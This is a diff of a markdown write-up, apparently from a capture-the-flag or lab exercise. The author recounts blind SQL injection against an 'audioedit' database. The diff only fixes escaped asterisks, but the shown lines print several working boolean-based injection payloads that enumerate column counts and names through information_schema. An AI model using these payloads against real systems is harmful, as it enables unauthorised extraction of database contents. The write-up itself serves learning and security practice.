@@ -117,12 +117,12 @@ Unfortunately, its hard to include in payload thats why i did `substr()` method.
 `setcmd()` function is sligtly modifed and exploiting gives me `audioedit` which is same as database name.
 
 Ah, i was tired and irritated. Took some **caffeine** again and got started. For numbers of columns in that table, querying information schema i used this:   
-`' and 2=2 or (SELECT substring(count(\*),1,1) FROM information_schema.columns WHERE table_name = 'audioedit')=1 or '`  
+`' and 2=2 or (SELECT substring(count(*),1,1) FROM information_schema.columns WHERE table_name = 'audioedit')=1 or '`  
 <br>
 So, columns number are 5, now what. Now, this part was very tough to debug. I just went mad trying to find out what was the problem. It took about 3 hours to find what was the problem. I crafted about 4-5 payloads, none of them were working.
 ```sql
 ' and 2=2 or (SELECT substr(column_name,1,1) FROM information_schema.columns where table_name='audioedit' limit 1 OFFSET 1)='a' or '
-' and 2=2 or (SELECT((SELECT count(\*) FROM information_schema.columns WHERE table_name = 'audioedit' and column_name LIKE 'xx%')=1)) or '
+' and 2=2 or (SELECT((SELECT count(*) FROM information_schema.columns WHERE table_name = 'audioedit' and column_name LIKE 'xx%')=1)) or '
 ' and 2=2 or (select substr(column_name,1,1)='y' from information_schema.columns where table_name = 'audioedit' limit 1,1) or '
 ```
 <br>
